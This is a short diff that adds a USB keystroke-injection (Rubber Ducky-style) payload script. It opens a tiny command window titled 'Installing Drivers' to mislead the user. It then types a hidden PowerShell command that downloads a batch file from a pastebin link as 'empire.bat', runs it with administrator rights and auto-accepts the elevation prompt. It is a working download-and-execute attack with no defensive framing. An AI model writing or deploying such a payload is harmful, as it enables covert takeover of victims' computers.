@@ -1,0 +1,9 @@
+REM do not forget to change the bat link in line 6
+GUI r
+DELAY 200
+STRING cmd /T:01 /K "@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers"
+DELAY 300
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://pastebin.com/raw/dRKKCYim','%TEMP%\empire.bat'); Start-Process "%TEMP%\empire.bat" -Verb runAs
+DELAY 5000
+ALT y
+ENTER
